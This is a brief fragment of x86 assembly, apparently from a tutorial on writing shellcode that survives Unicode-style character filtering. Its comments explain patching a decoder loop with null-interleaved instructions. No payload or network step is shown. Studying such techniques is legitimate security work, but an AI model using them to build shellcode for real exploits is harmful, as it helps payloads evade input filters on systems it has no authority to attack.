...
shellcode:
    ...
    ; start patching. Assuming EBP points to the baseaddress of this code,
    ; the decoder loop will be around EBP+0x100. Since our limited instruction
    ; set does not include a direct way to add a value to a register, we have
    ; to do this in another way:
    PUSH    EBX                         ;                        > A4A3A2A1
                    db 0x00, 0x53, 0x00 ;NOP - ADD [EBX+0], DL
    POP     ECX                         ; ECX = baseaddresss
